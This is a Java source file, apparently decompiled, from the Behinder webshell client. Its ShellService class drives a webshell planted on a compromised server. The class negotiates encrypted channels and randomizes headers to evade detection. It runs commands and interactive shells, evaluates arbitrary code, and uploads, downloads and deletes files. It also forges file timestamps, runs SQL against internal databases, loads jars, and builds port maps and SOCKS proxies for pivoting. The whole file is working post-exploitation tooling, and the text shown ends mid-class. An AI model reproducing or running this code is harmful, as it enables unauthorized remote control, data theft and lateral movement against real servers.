package net.rebeyond.behinder.core;

import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import java.io.FileOutputStream;
import java.net.URL;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.Set;
import javafx.application.Platform;
import javafx.scene.control.Alert;
import javafx.scene.control.Alert.AlertType;
import javafx.stage.Window;
import net.rebeyond.behinder.utils.Utils;
import org.json.JSONObject;

public class ShellService {
   public String currentUrl;
   public String currentPassword;
   public String currentKey;
   public String currentType;
   public Map currentHeaders;
   public int encryptType;
   public int beginIndex;
   public int endIndex;
   public JSONObject shellEntity;
   public static int BUFFSIZE = 46080;
   public static Map currentProxy;

   public ShellService(JSONObject shellEntity) throws Exception {
      this.encryptType = Constants.ENCRYPT_TYPE_AES;
      this.beginIndex = 0;
      this.endIndex = 0;
      this.shellEntity = shellEntity;
      this.currentUrl = shellEntity.getString("url");
      this.currentType = shellEntity.getString("type");
      this.currentPassword = shellEntity.getString("password");
      this.currentHeaders = new HashMap();
      this.initHeaders();
      this.mergeHeaders(this.currentHeaders, shellEntity.getString("headers"));
   }

   private void initHeaders() {
      this.currentHeaders.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
      this.currentHeaders.put("Accept-Encoding", "gzip, deflate, br");
      this.currentHeaders.put("Accept-Language", "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7");
      if (this.currentType.equals("php")) {
         this.currentHeaders.put("Content-type", "application/x-www-form-urlencoded");
      } else if (this.currentType.equals("aspx")) {
         this.currentHeaders.put("Content-Type", "application/octet-stream");
      } else if (this.currentType.equals("jsp")) {
         this.currentHeaders.put("Content-Type", "application/octet-stream");
      }

      this.currentHeaders.put("User-Agent", this.getCurrentUserAgent());
      if (((String)this.currentHeaders.get("User-Agent")).toLowerCase().indexOf("firefox") >= 0) {
         this.currentHeaders.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
         this.currentHeaders.put("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2");
      }

      this.currentHeaders.put("Referer", this.getReferer());
   }

   private String getReferer() {
      URL u = null;

      try {
         u = new URL(this.currentUrl);
         String oldPath = u.getPath();
         String newPath = "";
         String ext = oldPath.substring(oldPath.lastIndexOf("."));
         oldPath = oldPath.substring(0, oldPath.lastIndexOf("."));
         String[] parts = oldPath.split("/");

         for(int i = 0; i < parts.length; ++i) {
            if (parts[i].length() != 0) {
               if ((new Random()).nextBoolean()) {
                  int randomNum = (new Random()).nextInt(parts[i].length());
                  if (randomNum == 0) {
                     randomNum = 4;
                  }

                  String randStr = (new Random()).nextBoolean() ? Utils.getRandomString(randomNum).toLowerCase() : Utils.getRandomString(randomNum).toUpperCase();
                  newPath = newPath + "/" + randStr;
               } else {
                  newPath = newPath + "/" + parts[i];
               }
            }
         }

         newPath = newPath + ext;
         String refer = this.currentUrl.replace(u.getPath(), newPath);
         return refer;
      } catch (Exception var10) {
         return this.currentUrl;
      }
   }

   private String getCurrentUserAgent() {
      int uaIndex = (new Random()).nextInt(Constants.userAgents.length - 1);
      String currentUserAgent = Constants.userAgents[uaIndex];
      return currentUserAgent;
   }

   public static void setProxy(Map proxy) {
      currentProxy = proxy;
   }

   public static Map getProxy(Map proxy) {
      return currentProxy;
   }

   public JSONObject getShellEntity() {
      return this.shellEntity;
   }

   private void mergeCookie(Map headers, String cookie) {
      List newCookies = new ArrayList();
      String[] cookiePairs = cookie.split(";");

      for(int i = 0; i < cookiePairs.length; ++i) {
         Set cookiePropertyList = new HashSet(Arrays.asList(Constants.cookieProperty));
         String[] cookiePair = cookiePairs[i].split("=");
         if (cookiePair.length > 1) {
            String cookieKey = cookiePair[0];
            if (!cookiePropertyList.contains(cookieKey.toLowerCase().trim())) {
               newCookies.add(cookiePairs[i]);
            }
         }
      }

      String newCookiesString = String.join(";", newCookies);
      if (headers.containsKey("Cookie")) {
         String userCookie = (String)headers.get("Cookie");
         headers.put("Cookie", userCookie + ";" + newCookiesString);
      } else {
         headers.put("Cookie", newCookiesString);
      }

   }

   private void mergeHeaders(Map headers, String headerTxt) {
      String[] var3 = headerTxt.split("\n");
      int var4 = var3.length;

      for(int var5 = 0; var5 < var4; ++var5) {
         String line = var3[var5];
         int semiIndex = line.indexOf(":");
         if (semiIndex > 0) {
            String key = line.substring(0, semiIndex);
            key = this.formatHeaderName(key);
            String value = line.substring(semiIndex + 1);
            if (!value.equals("")) {
               headers.put(key, value);
            }
         }
      }

   }

   private String formatHeaderName(String beforeName) {
      String afterName = "";
      String[] var3 = beforeName.split("-");
      int var4 = var3.length;

      for(int var5 = 0; var5 < var4; ++var5) {
         String element = var3[var5];
         element = (element.charAt(0) + "").toUpperCase() + element.substring(1).toLowerCase();
         afterName = afterName + element + "-";
      }

      if (afterName.length() - beforeName.length() == 1 && afterName.endsWith("-")) {
         afterName = afterName.substring(0, afterName.length() - 1);
      }

      return afterName;
   }

   public boolean doConnect() throws Exception {
      boolean result = false;
      this.currentKey = Utils.getKey(this.currentPassword);

      String content;
      try {
         int randStringLength;
         JSONObject obj;
         if (this.currentType.equals("php")) {
            try {
               randStringLength = (new SecureRandom()).nextInt(3000);
               content = Utils.getRandomString(randStringLength);
               obj = this.echo(content);
               if (obj.getString("msg").equals(content)) {
                  result = true;
               }
            } catch (Exception var11) {
               this.encryptType = Constants.ENCRYPT_TYPE_XOR;

               try {
                  randStringLength = (new SecureRandom()).nextInt(3000);
                  content = Utils.getRandomString(randStringLength);
                  obj = this.echo(content);
                  if (obj.getString("msg").equals(content)) {
                     result = true;
                  }
               } catch (Exception var10) {
                  this.encryptType = Constants.ENCRYPT_TYPE_AES;
                  throw var10;
               }
            }
         } else {
            try {
               if (this.currentType.equals("asp")) {
                  this.encryptType = Constants.ENCRYPT_TYPE_XOR;
               }

               randStringLength = (new SecureRandom()).nextInt(3000);
               content = Utils.getRandomString(randStringLength);
               obj = this.echo(content);
               if (obj.getString("msg").equals(content)) {
                  result = true;
               }
            } catch (Exception var9) {
               throw var9;
            }
         }
      } catch (Exception var12) {
         System.out.println("The pre-shared key handshake fails and enters the dynamic key negotiation process.");
         Map keyAndCookie = Utils.getKeyAndCookie(this.currentUrl, this.currentPassword, this.currentHeaders);
         content = (String)keyAndCookie.get("cookie");
         if ((content == null || content.equals("")) && !this.currentHeaders.containsKey("cookie")) {
            String urlWithSession = (String)keyAndCookie.get("urlWithSession");
            if (urlWithSession != null) {
               this.currentUrl = urlWithSession;
            }

            this.currentKey = (String)Utils.getKeyAndCookie(this.currentUrl, this.currentPassword, this.currentHeaders).get("key");
         } else {
            this.mergeCookie(this.currentHeaders, content);
            this.currentKey = (String)keyAndCookie.get("key");
            if (this.currentType.equals("php") || this.currentType.equals("aspx")) {
               this.beginIndex = Integer.parseInt((String)keyAndCookie.get("beginIndex"));
               this.endIndex = Integer.parseInt((String)keyAndCookie.get("endIndex"));
            }
         }

         try {
            int randStringLength = (new SecureRandom()).nextInt(3000);
            content = Utils.getRandomString(randStringLength);
            JSONObject obj = this.echo(content);
            if (obj.getString("msg").equals(content)) {
               result = true;
            }
         } catch (Exception var8) {
            result = false;
         }
      }

      return result;
   }

   public String eval(String sourceCode) throws Exception {
      String result = null;
      byte[] payload = null;
      if (this.currentType.equals("jsp")) {
         payload = Utils.getClassFromSourceCode(sourceCode);
      } else {
         payload = sourceCode.getBytes();
      }

      byte[] data = Utils.getEvalData(this.currentKey, this.encryptType, this.currentType, payload);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      result = new String(resData);
      return result;
   }

   public JSONObject runCmd(String cmd, String path) throws Exception {
      Map params = new LinkedHashMap();
      params.put("cmd", cmd);
      params.put("path", path);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "Cmd", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
      JSONObject result = new JSONObject(resultTxt);
      Iterator var9 = result.keySet().iterator();

      while(var9.hasNext()) {
         String key = (String)var9.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public JSONObject createBShell(String target, String localPort) throws Exception {
      Map params = new LinkedHashMap();
      params.put("action", "create");
      params.put("target", target);
      params.put("localPort", localPort);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "BShell", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
      JSONObject result = new JSONObject(resultTxt);
      Iterator var9 = result.keySet().iterator();

      while(var9.hasNext()) {
         String key = (String)var9.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public JSONObject sendBShellCommand(String target, String action, String actionParams) throws Exception {
      Map params = new LinkedHashMap();
      params.put("action", action);
      params.put("target", target);
      params.put("params", actionParams);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "BShell", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
      JSONObject result = new JSONObject(resultTxt);
      Iterator var10 = result.keySet().iterator();

      while(var10.hasNext()) {
         String key = (String)var10.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public JSONObject submitPluginTask(String taskID, String payloadPath, Map pluginParams) throws Exception {
      byte[] pluginData = Utils.getPluginData(this.currentKey, this.encryptType, payloadPath, pluginParams, this.currentType);
      Map params = new HashMap();
      params.put("taskID", taskID);
      params.put("action", "submit");
      params.put("payload", Base64.encode(pluginData));
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "Plugin", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
      JSONObject result = new JSONObject(resultTxt);
      Iterator var11 = result.keySet().iterator();

      while(var11.hasNext()) {
         String key = (String)var11.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public JSONObject getPluginTaskResult(String taskID) throws Exception {
      Map params = new LinkedHashMap();
      params.put("taskID", taskID);
      params.put("action", "getResult");
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "Plugin", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
      JSONObject result = new JSONObject(resultTxt);
      Iterator var8 = result.keySet().iterator();

      while(var8.hasNext()) {
         String key = (String)var8.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public JSONObject loadJar(String libPath) throws Exception {
      Map params = new LinkedHashMap();
      params.put("libPath", libPath);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "Loader", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      JSONObject result = new JSONObject(resultTxt);
      Iterator var8 = result.keySet().iterator();

      while(var8.hasNext()) {
         String key = (String)var8.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public JSONObject createRealCMD(String bashPath) throws Exception {
      Map params = new LinkedHashMap();
      params.put("type", "create");
      params.put("bashPath", bashPath);
      if (this.currentType.equals("php")) {
         params.put("cmd", "");
      }

      params.put("whatever", Utils.getWhatever());
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "RealCMD", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      JSONObject result;
      if (!this.currentType.equals("php")) {
         result = new JSONObject(resultTxt);
      } else {
         result = new JSONObject();
         result.put("status", (Object)Base64.encode("success".getBytes()));
      }

      Iterator var8 = result.keySet().iterator();

      while(var8.hasNext()) {
         String key = (String)var8.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public JSONObject stopRealCMD() throws Exception {
      Map params = new LinkedHashMap();
      params.put("type", "stop");
      if (this.currentType.equals("php")) {
         params.put("bashPath", "");
         params.put("cmd", "");
      }

      params.put("whatever", Utils.getWhatever());
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "RealCMD", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      JSONObject result;
      if (!this.currentType.equals("php")) {
         result = new JSONObject(resultTxt);
      } else {
         result = new JSONObject();
         result.put("status", (Object)Base64.encode("success".getBytes()));
         result.put("msg", (Object)Base64.encode("msg".getBytes()));
      }

      Iterator var7 = result.keySet().iterator();

      while(var7.hasNext()) {
         String key = (String)var7.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public JSONObject readRealCMD() throws Exception {
      Map params = new LinkedHashMap();
      params.put("type", "read");
      if (this.currentType.equals("php")) {
         params.put("bashPath", "");
         params.put("cmd", "");
      }

      params.put("whatever", Utils.getWhatever());
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "RealCMD", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      JSONObject result = new JSONObject(resultTxt);
      Iterator var7 = result.keySet().iterator();

      while(var7.hasNext()) {
         String key = (String)var7.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public JSONObject writeRealCMD(String cmd) throws Exception {
      Map params = new LinkedHashMap();
      params.put("type", "write");
      if (this.currentType.equals("php")) {
         params.put("bashPath", "");
      }

      params.put("cmd", Base64.encode(cmd.getBytes()));
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "RealCMD", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      JSONObject result = new JSONObject(resultTxt);
      Iterator var8 = result.keySet().iterator();

      while(var8.hasNext()) {
         String key = (String)var8.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public JSONObject listFiles(String path) throws Exception {
      Map params = new LinkedHashMap();
      params.put("mode", "list");
      params.put("path", path);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      JSONObject result = new JSONObject(resultTxt);
      Iterator var8 = result.keySet().iterator();

      while(var8.hasNext()) {
         String key = (String)var8.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public JSONObject getTimeStamp(String path) throws Exception {
      Map params = new LinkedHashMap();
      params.put("mode", "getTimeStamp");
      params.put("path", path);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      JSONObject result = new JSONObject(resultTxt);
      Iterator var8 = result.keySet().iterator();

      while(var8.hasNext()) {
         String key = (String)var8.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public JSONObject updateTimeStamp(String path, String createTimeStamp, String modifyTimeStamp, String accessTimeStamp) throws Exception {
      Map params = new LinkedHashMap();
      params.put("mode", "updateTimeStamp");
      params.put("path", path);
      params.put("createTimeStamp", createTimeStamp);
      params.put("accessTimeStamp", accessTimeStamp);
      params.put("modifyTimeStamp", modifyTimeStamp);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      JSONObject result = new JSONObject(resultTxt);
      Iterator var11 = result.keySet().iterator();

      while(var11.hasNext()) {
         String key = (String)var11.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public JSONObject updateModifyTimeStamp(String path, String modifyTimeStamp) throws Exception {
      return this.updateTimeStamp(path, "", modifyTimeStamp, "");
   }

   public JSONObject deleteFile(String path) throws Exception {
      Map params = new LinkedHashMap();
      params.put("mode", "delete");
      params.put("path", path);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      JSONObject result = new JSONObject(resultTxt);
      Iterator var8 = result.keySet().iterator();

      while(var8.hasNext()) {
         String key = (String)var8.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public JSONObject showFile(String path, String charset) throws Exception {
      Map params = new LinkedHashMap();
      params.put("mode", "show");
      params.put("path", path);
      if (this.currentType.equals("php")) {
         params.put("content", "");
      } else if (this.currentType.equals("asp")) {
      }

      if (charset != null) {
         params.put("charset", charset);
      }

      byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      JSONObject result = new JSONObject(resultTxt);
      Iterator var9 = result.keySet().iterator();

      while(var9.hasNext()) {
         String key = (String)var9.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public JSONObject renameFile(String oldName, String newName) throws Exception {
      Map params = new LinkedHashMap();
      params.put("mode", "rename");
      params.put("path", oldName);
      if (this.currentType.equals("php")) {
         params.put("content", "");
         params.put("charset", "");
      }

      params.put("newPath", newName);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      JSONObject result = new JSONObject(resultTxt);
      Iterator var9 = result.keySet().iterator();

      while(var9.hasNext()) {
         String key = (String)var9.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public JSONObject createFile(String fileName) throws Exception {
      Map params = new LinkedHashMap();
      params.put("mode", "createFile");
      params.put("path", fileName);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      JSONObject result = new JSONObject(resultTxt);
      Iterator var8 = result.keySet().iterator();

      while(var8.hasNext()) {
         String key = (String)var8.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public JSONObject createDirectory(String dirName) throws Exception {
      Map params = new LinkedHashMap();
      params.put("mode", "createDirectory");
      params.put("path", dirName);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      JSONObject result = new JSONObject(resultTxt);
      Iterator var8 = result.keySet().iterator();

      while(var8.hasNext()) {
         String key = (String)var8.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public void downloadFile(String remotePath, String localPath) throws Exception {
      byte[] fileContent = null;
      Map params = new LinkedHashMap();
      params.put("mode", "download");
      params.put("path", remotePath);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
      fileContent = (byte[])((byte[])Utils.sendPostRequestBinary(this.currentUrl, this.currentHeaders, data).get("data"));
      FileOutputStream fso = new FileOutputStream(localPath);
      fso.write(fileContent);
      fso.flush();
      fso.close();
   }

   public JSONObject execSQL(String type, String host, String port, String user, String pass, String database, String sql) throws Exception {
      Map params = new LinkedHashMap();
      params.put("type", type);
      params.put("host", host);
      params.put("port", port);
      params.put("user", user);
      params.put("pass", pass);
      params.put("database", database);
      params.put("sql", sql);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "Database", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      JSONObject result = new JSONObject(resultTxt);
      Iterator var14 = result.keySet().iterator();

      while(var14.hasNext()) {
         String key = (String)var14.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public JSONObject uploadFile(String remotePath, byte[] fileContent, boolean useBlock) throws Exception {
      Map params = new LinkedHashMap();
      JSONObject result = null;
      byte[] data;
      String resultTxt;
      if (!useBlock) {
         params.put("mode", "create");
         params.put("path", remotePath);
         params.put("content", Base64.encode(fileContent));
         data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
         Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
         data = (byte[])((byte[])resultObj.get("data"));
         resultTxt = new String(Crypt.Decrypt(data, this.currentKey, this.encryptType, this.currentType));
         result = new JSONObject(resultTxt);
         Iterator var10 = result.keySet().iterator();

         while(var10.hasNext()) {
            resultTxt = (String)var10.next();
            result.put(resultTxt, (Object)(new String(Base64.decode(result.getString(resultTxt)), "UTF-8")));
         }
      } else {
         List blocks = Utils.splitBytes(fileContent, BUFFSIZE);

         for(int i = 0; i < blocks.size(); ++i) {
            if (i == 0) {
               params.put("mode", "create");
            } else {
               params.put("mode", "append");
            }

            params.put("path", remotePath);
            params.put("content", Base64.encode((byte[])blocks.get(i)));
            data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
            Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
            byte[] resData = (byte[])((byte[])resultObj.get("data"));
            resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
            result = new JSONObject(resultTxt);
            Iterator var12 = result.keySet().iterator();

            while(var12.hasNext()) {
               String key = (String)var12.next();
               result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
            }
         }
      }

      return result;
   }

   public JSONObject uploadFile(String remotePath, byte[] fileContent) throws Exception {
      Map params = new LinkedHashMap();
      params.put("mode", "create");
      params.put("path", remotePath);
      params.put("content", Base64.encode(fileContent));
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      JSONObject result = new JSONObject(resultTxt);
      Iterator var9 = result.keySet().iterator();

      while(var9.hasNext()) {
         String key = (String)var9.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public JSONObject appendFile(String remotePath, byte[] fileContent) throws Exception {
      Map params = new LinkedHashMap();
      params.put("mode", "append");
      params.put("path", remotePath);
      params.put("content", Base64.encode(fileContent));
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      byte[] resData = (byte[])((byte[])resultObj.get("data"));
      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
      JSONObject result = new JSONObject(resultTxt);
      Iterator var9 = result.keySet().iterator();

      while(var9.hasNext()) {
         String key = (String)var9.next();
         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
      }

      return result;
   }

   public boolean createRemotePortMap(String targetIP, String targetPort, String remoteIP, String remotePort) throws Exception {
      Map params = new LinkedHashMap();
      params.put("action", "createRemote");
      params.put("targetIP", targetIP);
      params.put("targetPort", targetPort);
      if (this.currentType.equals("php")) {
         params.put("socketHash", "");
      }

      params.put("remoteIP", remoteIP);
      params.put("remotePort", remotePort);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);
      Map result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      Map resHeader = (Map)result.get("header");
      byte[] resData = (byte[])((byte[])result.get("data"));
      if (((String)resHeader.get("status")).equals("200")) {
         if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
            resData = Arrays.copyOfRange(resData, 4, resData.length);
            throw new Exception(new String(resData));
         } else {
            return true;
         }
      } else {
         return false;
      }
   }

   public boolean createRemoteSocks(String targetIP, String targetPort, String remoteIP, String remotePort) throws Exception {
      Map params = new LinkedHashMap();
      params.put("action", "createRemote");
      params.put("targetIP", targetIP);
      params.put("targetPort", targetPort);
      params.put("remoteIP", remoteIP);
      params.put("remotePort", remotePort);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);
      Map result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      Map resHeader = (Map)result.get("header");
      byte[] resData = (byte[])((byte[])result.get("data"));
      if (((String)resHeader.get("status")).equals("200")) {
         if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
            resData = Arrays.copyOfRange(resData, 4, resData.length);
            throw new Exception(new String(resData));
         } else {
            return true;
         }
      } else {
         return false;
      }
   }

   public boolean createVPSSocks(String remoteIP, String remotePort) throws Exception {
      Map params = new LinkedHashMap();
      params.put("action", "create");
      params.put("remoteIP", remoteIP);
      params.put("remotePort", remotePort);
      byte[] data = Utils.getData(this.currentKey, this.encryptType, "RemoteSocksProxy", params, this.currentType);
      Map result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
      Map resHeader = (Map)result.get("header");
      byte[] resData = (byte[])((byte[])result.get("data"));
      if (((String)resHeader.get("status")).equals("200")) {
         if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
            resData = Arrays.copyOfRange(resData, 4, resData.length);
            throw new Exception(new String(resData));
         } else {
            return true;
         }
      } else {
         return false;
      }
   }

